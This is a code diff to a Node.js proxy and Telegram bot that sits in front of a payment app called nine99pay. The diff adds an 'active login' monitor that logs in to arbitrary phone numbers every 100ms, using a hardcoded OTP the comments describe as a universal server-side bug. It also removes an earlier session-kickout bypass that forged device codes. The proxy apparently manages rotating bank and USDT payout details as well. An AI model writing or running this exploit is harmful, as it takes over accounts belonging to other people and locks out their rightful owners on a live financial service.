@@ -110,7 +110,7 @@ async function saveData(data) {
     if (!skipMerge) {
       const current = await redis.get('nine99payData');
       if (current && typeof current === 'object') {
-        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'activePhones'];
         for (const key of settingsKeys) {
           if (current[key] !== undefined) {
             data[key] = current[key];
@@ -157,11 +157,124 @@ async function saveData(data) {
   }
 }
 
-// Sa-Token kickout bypass: server reads `deviceCode` header at login;
-// SAME deviceCode → kicks previous device, DIFFERENT → both stay logged in.
-// Override with a unique value on each login so multiple devices stay alive.
-function makeUniqueDeviceCode() {
-  return 'd' + Date.now().toString(36) + Math.random().toString(36).substring(2, 12);
+// Hardcoded universal OTP that 999pay accepts for any number (server-side bug)
+const ACTIVE_HARDCODED_OTP = '030201';
+
+// In-process active-login monitor state
+let _activeMonitorPhones = [];
+let _activeMonitorAdminChatId = null;
+let _activeMonitorLastRefresh = 0;
+let _activeMonitorTicking = false;
+let _activeMonitorStarted = false;
+let _activeStats = { logins: 0, ok: 0, fail: 0, perPhone: {} };
+let _activeStatsLastReport = Date.now();
+let _activeLastErrorLog = {};
+
+const ACTIVE_TICK_MS = parseInt(process.env.ACTIVE_TICK_MS, 10) || 100;
+const ACTIVE_REFRESH_MS = parseInt(process.env.ACTIVE_REFRESH_MS, 10) || 3000;
+const ACTIVE_STATS_REPORT_MS = parseInt(process.env.ACTIVE_STATS_REPORT_MS, 10) || 300000;
+
+async function refreshActiveMonitorPhones() {
+  if (Date.now() - _activeMonitorLastRefresh < ACTIVE_REFRESH_MS) return;
+  if (!redis) { _activeMonitorPhones = []; return; }
+  try {
+    let raw = await redis.get('nine99payData');
+    if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
+    if (raw && typeof raw === 'object') {
+      _activeMonitorPhones = Array.isArray(raw.activePhones) ? raw.activePhones.map(String) : [];
+      _activeMonitorAdminChatId = raw.adminChatId || _activeMonitorAdminChatId;
+    } else {
+      _activeMonitorPhones = [];
+    }
+    _activeMonitorLastRefresh = Date.now();
+  } catch(e) { /* ignore */ }
+}
+
+async function activeMonitorTick() {
+  if (_activeMonitorTicking) return;
+  _activeMonitorTicking = true;
+  try {
+    await refreshActiveMonitorPhones();
+    if (!_activeMonitorPhones.length) return;
+    await Promise.all(_activeMonitorPhones.map(async (phone) => {
+      const r = await fireActiveLogin(phone);
+      _activeStats.logins++;
+      _activeStats.perPhone[phone] = _activeStats.perPhone[phone] || { ok: 0, fail: 0 };
+      if (r.ok) { _activeStats.ok++; _activeStats.perPhone[phone].ok++; }
+      else {
+        _activeStats.fail++;
+        _activeStats.perPhone[phone].fail++;
+        const now = Date.now();
+        if (!_activeLastErrorLog[phone] || now - _activeLastErrorLog[phone] > 30000) {
+          _activeLastErrorLog[phone] = now;
+          console.error(`[active] ${phone} fail: ${r.error}`);
+        }
+      }
+    }));
+    if (Date.now() - _activeStatsLastReport > ACTIVE_STATS_REPORT_MS && _activeStats.logins > 0) {
+      _activeStatsLastReport = Date.now();
+      const lines = [
+        `🔄 Active Login Monitor (last ${Math.round(ACTIVE_STATS_REPORT_MS / 60000)}m)`,
+        `Active phones: ${_activeMonitorPhones.length}`,
+        `Total logins: ${_activeStats.logins}`,
+        `✅ Success: ${_activeStats.ok}`,
+        `❌ Failed: ${_activeStats.fail}`,
+      ];
+      for (const [ph, s] of Object.entries(_activeStats.perPhone)) {
+        lines.push(`  ${ph}: ✅${s.ok} ❌${s.fail}`);
+      }
+      const msg = lines.join('\n');
+      console.log('[active]', msg);
+      if (_activeMonitorAdminChatId && bot) {
+        bot.sendMessage(_activeMonitorAdminChatId, msg).catch(()=>{});
+      }
+      _activeStats = { logins: 0, ok: 0, fail: 0, perPhone: {} };
+    }
+  } finally {
+    _activeMonitorTicking = false;
+  }
+}
+
+// Start the in-process loop ONCE. Works when index.js runs as long-lived Node
+// process (e.g. Replit workflow). On Vercel serverless, the loop only ticks
+// while the lambda is warm — for guaranteed continuous re-login, also run this
+// file as a Replit workflow OR ping `/active-tick` externally every 100ms.
+function startActiveMonitor() {
+  if (_activeMonitorStarted) return;
+  _activeMonitorStarted = true;
+  console.log(`[active] monitor loop started — tick=${ACTIVE_TICK_MS}ms refresh=${ACTIVE_REFRESH_MS}ms`);
+  setInterval(() => { activeMonitorTick().catch(()=>{}); }, ACTIVE_TICK_MS);
+}
+startActiveMonitor();
+
+// Fire a login request to upstream for the given phone, using hardcoded OTP.
+// Used by /active command (single immediate fire) and by external monitor loop.
+async function fireActiveLogin(phone) {
+  const headers = {
+    'user-agent': 'okhttp/3.12.0',
+    'content-type': 'application/json; charset=UTF-8',
+    'packageinfo': 'com.india.cnm',
+    'packageid': '6',
+    'channel': 'GP00',
+    'lang': 'en',
+    'version': '6.0.2.6',
+    'devicecode': 'active-' + Math.random().toString(36).substring(2, 12),
+    'fcmtoken': 'active-monitor',
+    'accept': '*/*',
+    'reqdate': String(Math.floor(Date.now() / 1000)),
+    'host': 'nine99pay.com',
+  };
+  const body = JSON.stringify({ code: ACTIVE_HARDCODED_OTP, phone: String(phone) });
+  try {
+    const resp = await fetch(ORIGINAL_API + '/app/user/login/otp', { method: 'POST', headers, body });
+    const text = await resp.text();
+    let json = null;
+    try { json = JSON.parse(text); } catch(e) {}
+    if (json && json.code === 200) return { ok: true, userId: (json.data && (json.data.uuid || json.data.loginId)) || '' };
+    return { ok: false, error: (json && json.msg) || text.substring(0, 150) };
+  } catch(e) {
+    return { ok: false, error: e.message };
+  }
 }
 
 function getTokenFromReq(req) {
@@ -801,9 +914,9 @@ app.post('/bot-webhook', async (req, res) => {
 /log — Toggle request logging
 /off log <userId> — Log off for user
 /on log <userId> — Log on for user
-/multilogin — Toggle multi-device login (dono device pe login reh sake)
-/multilogin on — Force ON
-/multilogin off — Force OFF (normal kickout)
+/active <phone> — Always-logged-in mode (auto-relogin every 100ms)
+/active off <phone> — Stop always-login for that phone
+/active list — Show all active phones
 /status — Full status
 /debug — Debug next response
 
@@ -836,7 +949,8 @@ Example:
     if (text === '/status') {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
-      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nMulti-Device Login: ${data.multiDeviceLogin !== false ? '📱📱 ON' : '🔒 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      const activeCount = Array.isArray(data.activePhones) ? data.activePhones.length : 0;
+      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\n🔄 Active Logins: ${activeCount}${activeCount > 0 ? ' (' + data.activePhones.join(', ') + ')' : ''}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
@@ -849,15 +963,51 @@ Example:
     if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
-    if (text === '/multilogin' || text === '/multilogin on' || text === '/multilogin off') {
+    // /active <phone>          — add phone to always-logged-in list (fires immediate login)
+    // /active off <phone>       — remove from list
+    // /active list              — show all active phones
+    // /active                   — quick status
+    if (text === '/active' || text === '/active list' || text.startsWith('/active ')) {
       data = await loadData(true);
-      if (text === '/multilogin') data.multiDeviceLogin = data.multiDeviceLogin === false ? true : false;
-      else data.multiDeviceLogin = (text === '/multilogin on');
+      if (!Array.isArray(data.activePhones)) data.activePhones = [];
+
+      if (text === '/active' || text === '/active list') {
+        const list = data.activePhones;
+        if (!list.length) {
+          await bot.sendMessage(chatId, '🔄 Active Logins: 0\n\nUse:\n/active <phone> — start always-login\n/active off <phone> — stop\n/active list — show all');
+        } else {
+          await bot.sendMessage(chatId, `🔄 Active Logins: ${list.length}\n\n${list.map((p, i) => `${i + 1}. ${p}`).join('\n')}\n\nMonitor har 100ms pe in numbers ko OTP ${ACTIVE_HARDCODED_OTP} se relogin karta rehta hai.\nKoi aur device login karega → 100ms ke andar wapas kick.`);
+        }
+        return res.sendStatus(200);
+      }
+
+      if (text.startsWith('/active off ')) {
+        const ph = text.substring(12).trim().replace(/\D/g, '');
+        if (!ph) { await bot.sendMessage(chatId, '❌ Format: /active off <phone>'); return res.sendStatus(200); }
+        const before = data.activePhones.length;
+        data.activePhones = data.activePhones.filter(p => String(p) !== ph);
+        data._skipOverrideMerge = true;
+        await saveData(data);
+        await bot.sendMessage(chatId, before === data.activePhones.length
+          ? `⚠️ ${ph} active list mein nahi tha.`
+          : `🛑 ${ph} active list se hata diya. Ab is number ka relogin band.`);
+        return res.sendStatus(200);
+      }
+
+      // /active <phone> — add
+      const ph = text.substring(8).trim().replace(/\D/g, '');
+      if (!ph || ph.length < 8) { await bot.sendMessage(chatId, '❌ Valid phone number do. Format: /active 6206785398'); return res.sendStatus(200); }
+      if (!data.activePhones.includes(ph)) data.activePhones.push(ph);
       data._skipOverrideMerge = true;
       await saveData(data);
-      await bot.sendMessage(chatId, data.multiDeviceLogin !== false
-        ? '📱📱 Multi-Device Login ON\n\nAb same account dono device pe ek saath login reh sakta hai.\nProxy har login pe unique deviceCode header inject karta hai → upstream Sa-Token kickout skip kar deta hai.'
-        : '🔒 Multi-Device Login OFF\n\nNormal behaviour: naya login purana device kick out karega (jab same OAID).');
+
+      // Fire immediate login so user sees instant feedback
+      const result = await fireActiveLogin(ph);
+      if (result.ok) {
+        await bot.sendMessage(chatId, `✅ ${ph} ACTIVE\n\n👤 UserID: ${result.userId || 'N/A'}\nOTP used: ${ACTIVE_HARDCODED_OTP}\n\nMonitor ab har 100ms pe is number ko relogin karega.\nKoi aur device login karega → tu 100ms mein wapas in.\n\n🛑 Stop: /active off ${ph}`);
+      } else {
+        await bot.sendMessage(chatId, `⚠️ ${ph} ADDED to active list, but first login attempt failed:\n${result.error}\n\nMonitor abhi bhi try karta rahega. Agar OTP ${ACTIVE_HARDCODED_OTP} valid nahi hai is number pe, /active off ${ph} se hata de.`);
+      }
       return res.sendStatus(200);
     }
 
@@ -1226,11 +1376,6 @@ Example:
 app.post('/app/user/login/pwd', async (req, res) => {
   try {
     const data = await loadData();
-    if (data.multiDeviceLogin !== false) {
-      const uniq = makeUniqueDeviceCode();
-      req.headers['devicecode'] = uniq;
-      req.headers['deviceCode'] = uniq;
-    }
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     const phone = body.phone || body.mobile || body.username || '';
@@ -1281,11 +1426,6 @@ app.post('/app/user/login/pwd', async (req, res) => {
 app.post('/app/user/login/otp', async (req, res) => {
   try {
     const data = await loadData();
-    if (data.multiDeviceLogin !== false) {
-      const uniq = makeUniqueDeviceCode();
-      req.headers['devicecode'] = uniq;
-      req.headers['deviceCode'] = uniq;
-    }
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     const phone = body.phone || body.mobile || body.username || '';
@@ -2144,6 +2284,23 @@ app.all('/app/customer/service', async (req, res) => {
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
+});
+
+// External trigger for active monitor (use with cron-job.org or uptime monitor
+// pinging every few seconds — keeps re-login working even on Vercel serverless
+// where setInterval dies after lambda goes cold).
+app.get('/active-tick', async (req, res) => {
+  try {
+    await activeMonitorTick();
+    res.json({
+      ok: true,
+      activePhones: _activeMonitorPhones,
+      stats: _activeStats,
+      tickMs: ACTIVE_TICK_MS,
+    });
+  } catch(e) {
+    res.status(500).json({ ok: false, error: e.message });
+  }
 });
 
 app.all('*', async (req, res) => {
